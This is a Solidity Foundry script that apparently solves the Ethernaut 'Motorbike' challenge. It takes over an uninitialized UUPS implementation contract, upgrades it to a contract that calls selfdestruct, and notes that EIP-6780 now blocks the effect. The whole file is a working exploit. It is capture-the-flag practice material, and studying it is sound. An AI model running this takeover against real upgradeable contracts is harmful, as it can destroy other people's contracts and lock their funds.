// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import {Motorbike, Engine} from "../src/level25.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

///@notice 
contract Level24Solution is Script {
    Motorbike level = Motorbike(0x458EACf79d20D67A0967d2F4f11cC99EBd1092f2);
    address engineAddress = address(uint160(uint256(vm.load(address(level), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))));
    Engine engine = Engine(engineAddress);
    
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // 1. Initialize the engine contract and get upgrader role
        // 2. This allows us to then call upgradeToAndCall()
        // 3. Deploy exploit contract
        // 4. Update to exploit contract and call selfdestruct()
        // Notes
        // To add --legacy suffix to fix error: Failed to get EIP-1559 fees
        // This level is not solvable as selfdestruct() no longer destroys the contract (EIP-6780)
        
        engine.initialize();
        Exploit exploit = new Exploit();
        bytes memory data = abi.encodeWithSignature("explode()");
        engine.upgradeToAndCall(address(exploit), data);

        vm.stopBroadcast();
    }
}

contract Exploit {
    function explode() external {
        selfdestruct(payable(msg.sender));
    }
}
